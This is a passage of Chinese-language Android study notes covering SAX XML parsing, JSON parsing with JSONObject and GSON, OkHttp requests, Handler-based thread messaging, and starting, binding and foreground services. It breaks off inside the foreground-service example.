<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ContentHandler</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContentHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nodeName;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">//根据当前结点将内容添加到哪一个StringBuilder对象中</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;id&quot;</span>.equals(nodeName))</span><br><span class="line">            id.append(ch,start,length);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;name&quot;</span>.equals(nodeName))</span><br><span class="line">            name.append(ch,start,length);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;version&quot;</span>.equals(nodeName))</span><br><span class="line">            version.append(ch, start, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line"><span class="comment">//        记录当前结点名</span></span><br><span class="line">        nodeName = localName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;app&quot;</span>.equals(localName))</span><br><span class="line">        &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;id is &quot;</span>+id.toString().trim() );</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;name is &quot;</span>+name.toString().trim() );</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;version is &quot;</span>+version.toString().trim() );</span><br><span class="line">            <span class="comment">//清空StringBuilder</span></span><br><span class="line">            id.setLength(<span class="number">0</span>);</span><br><span class="line">            name.setLength(<span class="number">0</span>);</span><br><span class="line">            version.setLength(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        name = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        version = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="解析json"><a href="#解析json" class="headerlink" title="解析json"></a>解析json</h3><h4 id="JSONobject解析"><a href="#JSONobject解析" class="headerlink" title="JSONobject解析"></a>JSONobject解析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;http://10.0.2.2:88/get_data.json&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                Response response = client.newCall(request).execute();</span><br><span class="line">                String responseData = response.body().string();</span><br><span class="line">                parseJSONWithJSONObject(responseData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithJSONObject</span><span class="params">(String jsonData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray(jsonData);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;jsonArray.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            JSONObject jsonObject = jsonArray.getJSONObject(i);</span><br><span class="line">            String id = jsonObject.getString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            String name = jsonObject.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            String version = jsonObject.getString(<span class="string">&quot;version&quot;</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+id);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+name);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+version);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;e.printStackTrace();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="GSON解析"><a href="#GSON解析" class="headerlink" title="GSON解析"></a>GSON解析</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&#x27;com.google.code.gson:gson:2.8.6&#x27;</span></span><br></pre></td></tr></table></figure>

<p>新建一个App类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.networktest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(StringBuilder id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(StringBuilder name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVersion</span><span class="params">(StringBuilder version)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.version = version;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> version;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;http://10.0.2.2:88/get_data.json&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithGSON(responseData);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithGSON</span><span class="params">(String jsonData)</span></span>&#123;</span><br><span class="line">        Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">        List &lt;App&gt; appList = gson.fromJson(jsonData,<span class="keyword">new</span> TypeToken&lt;List&lt;App&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">        <span class="keyword">for</span>(App app: appList)</span><br><span class="line">        &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+app.getId());</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+app.getName());</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+app.getVersion());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="封装网络请求"><a href="#封装网络请求" class="headerlink" title="封装网络请求"></a>封装网络请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">           sendRequestWithOkHttp();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span>&#123;</span><br><span class="line">                   String address = <span class="string">&quot;http://www.baidu.com&quot;</span>;</span><br><span class="line">                   Httputil.sendOkHttpRequest(address,<span class="keyword">new</span> Callback()</span><br><span class="line">                   &#123;</span><br><span class="line">                       <span class="meta">@Override</span></span><br><span class="line">                       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="meta">@NotNull</span> Call call, <span class="meta">@NotNull</span> IOException e)</span> </span>&#123;</span><br><span class="line">                           <span class="comment">//                            异常处理情况</span></span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="meta">@Override</span></span><br><span class="line">                       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(<span class="meta">@NotNull</span> Call call, <span class="meta">@NotNull</span> Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                           <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">//得到服务器的返回的具体内容</span></span><br><span class="line">                               String responseData = response.body().string();</span><br><span class="line">                               Log.d(<span class="string">&quot;Main&quot;</span>, responseData);</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">catch</span> (Exception e1)</span><br><span class="line">                           &#123;</span><br><span class="line">                               e1.printStackTrace();</span><br><span class="line">                           &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">catch</span> (Exception e)</span><br><span class="line">               &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><h3 id="例子，子线程更改ui-安卓多线程"><a href="#例子，子线程更改ui-安卓多线程" class="headerlink" title="例子，子线程更改ui,安卓多线程"></a>例子，子线程更改ui,安卓多线程</h3><p>android在子线程中不能直接对ui进行操作，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TextView text;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UPDATE_TEXT = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        text = (TextView) findViewById(R.id.text);</span><br><span class="line">        Button changeText = (Button) findViewById(R.id.change_text);</span><br><span class="line">        changeText.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        @SuppressLint(&quot;HandlerLeak&quot;)</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what)&#123;</span><br><span class="line">                <span class="keyword">case</span> UPDATE_TEXT:</span><br><span class="line">                    text.setText(<span class="string">&quot;nice to meet you&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.change_text:</span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//         不能这么干，需新建一个Message用于传值               text.setText(&quot;nice to meet you&quot;);</span></span><br><span class="line">                        Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                        message.what = UPDATE_TEXT;</span><br><span class="line">                        handler.sendMessage(message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="异步消息处理机制"><a href="#异步消息处理机制" class="headerlink" title="异步消息处理机制"></a>异步消息处理机制</h3><ol>
<li><p><strong>Message</strong></p>
<p>Message是在线程之间传递的消息，它可以在内部携带少量的信息，用于在不同线程之间交换数据。上一小节中我们使用到了Message的<code>what</code> 字段，除此之外还可以使用<code>arg1</code> 和<code>arg2</code> 字段来携带一些整型数据，使用<code>obj</code> 字段携带一个<code>Object</code> 对象。</p>
</li>
<li><p><strong>Handler</strong></p>
<p>Handler顾名思义也就是处理者的意思，它主要是用于发送和处理消息的。发送消息一般是使用Handler的<code>sendMessage()</code> 方法，而发出的消息经过一系列地辗转处理后，最终会传递到Handler的<code>handleMessage()</code> 方法中。</p>
</li>
<li><p><strong>MessageQueue</strong></p>
<p>MessageQueue是消息队列的意思，它主要用于存放所有通过Handler发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个<code>MessageQueue</code> 对象。</p>
</li>
<li><p><strong>Looper</strong></p>
<p>Looper是每个线程中的MessageQueue的管家，调用Looper的<code>loop()</code> 方法后，就会进入到一个无限循环当中，然后每当发现MessageQueue中存在一条消息，就会将它取出，并传递到Handler的<code>handleMessage()</code> 方法中。每个线程中也只会有一个<code>Looper</code> 对象。</p>
</li>
</ol>
<p>了解了Message、Handler、MessageQueue以及Looper的基本概念后，我们再来把异步消息处理的整个流程梳理一遍。首先需要在主线程当中创建一个<code>Handler</code> 对象，并重写<code>handleMessage()</code> 方法。然后当子线程中需要进行UI操作时，就创建一个<code>Message</code> 对象，并通过Handler将这条消息发送出去。之后这条消息会被添加到MessageQueue的队列中等待被处理，而Looper则会一直尝试从MessageQueue中取出待处理消息，最后分发回Handler的<code>handleMessage()</code> 方法中。由于Handler是在主线程中创建的，所以此时<code>handleMessage()</code> 方法中的代码也会在主线程中运行，于是我们在这里就可以安心地进行UI操作了。整个异步消息处理机制的流程示意图如图</p>
<p><img src="http://reader.epubee.com/books/mobile/32/329412efee610df045d528feddfae349/Image00250.jpg"></p>
<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义两个id为stop_service 和start_service 的按钮,MainActivity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService  = (Button)findViewById(R.id.start_service);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.class);<span class="comment">//构造intent启动服务</span></span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.class);</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//右键新建一个服务，命名为MyService </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//仅在第一次启动时运行</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//每次点击开始服务按钮都会运行</span></span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onStartCommand: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//销毁服务时运行</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onDestroy: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="活动服务通信绑定-bind"><a href="#活动服务通信绑定-bind" class="headerlink" title="活动服务通信绑定(bind)"></a>活动服务通信绑定(bind)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyService 添加一个类</span></span><br><span class="line">    <span class="keyword">private</span> DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload: &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress: &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重载绝对方法IBinder</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line"> <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;<span class="comment">//MyService 中的类实例</span></span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;<span class="comment">//连接服务</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;<span class="comment">//转型成downloadBinder</span></span><br><span class="line">            <span class="comment">//调用服务中定义的方法</span></span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//in OnClick() 添加按钮，按下绑定服务按钮会启动服务并且执行onServiceConnected中的代码</span></span><br><span class="line"> 			<span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService.class);</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE); <span class="comment">// 绑定服务</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection); <span class="comment">// 解绑服务</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="前台服务"><a href="#前台服务" class="headerlink" title="前台服务"></a>前台服务</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改MyService代码为</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Channel ID 必须保证唯一，修改点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CHANNEL_ID = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTIFICATION_ID = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *通过通知启动前台服务,修改点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@androidx</span>.annotation.RequiresApi(api = Build.VERSION_CODES.O)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setForegroundService</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//设定的通知渠道名称</span></span><br><span class="line">        String channelName = <span class="string">&quot;hello&quot;</span>;<span class="comment">//getString(R.string.channel_name);</span></span><br><span class="line">        <span class="comment">//设置通知的重要程度</span></span><br><span class="line">        <span class="keyword">int</span> importance = NotificationManager.IMPORTANCE_LOW;</span><br><span class="line">        <span class="comment">//构建通知渠道</span></span><br><span class="line">        NotificationChannel channel = <span class="keyword">new</span> NotificationChannel(CHANNEL_ID, channelName, importance);</span><br><span class="line">        channel.setDescription(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//在创建的通知渠道上发送通知</span></span><br><span class="line">        NotificationCompat.Builder builder = <span class="keyword">new</span> 